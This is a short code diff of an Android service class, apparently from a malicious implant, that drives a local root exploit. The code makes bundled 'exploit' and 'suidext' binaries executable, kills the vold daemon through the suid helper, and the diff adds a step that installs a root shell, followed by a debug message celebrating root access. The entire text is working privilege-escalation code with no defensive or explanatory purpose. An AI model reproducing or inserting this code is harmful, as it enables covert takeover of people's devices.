@@ -125,12 +125,9 @@ public class ServiceCore extends Service {
 			File filesPath = getApplicationContext().getFilesDir();
 			String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec(
-					"/system/bin/chmod 755 " + path + "/" + exploit);
-			Runtime.getRuntime().exec(
-					"/system/bin/chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec(
-					"/system/bin/chmod 666 " + path + "/" + crashlog);
+			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + exploit);
+			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + suidext);
+			Runtime.getRuntime().exec("/system/bin/chmod 666 " + path + "/" + crashlog);
 
 			final String exppath = path + "/" + exploit;
 
@@ -156,6 +153,9 @@ public class ServiceCore extends Service {
 				// Killiamo VOLD per due volte
 				Runtime.getRuntime().exec(path + "/" + suidext + " vol");
 
+				// Installiamo la shell root
+				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
+				
 				if (Cfg.DEBUG) {
 					Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
 					Toast.makeText(this,
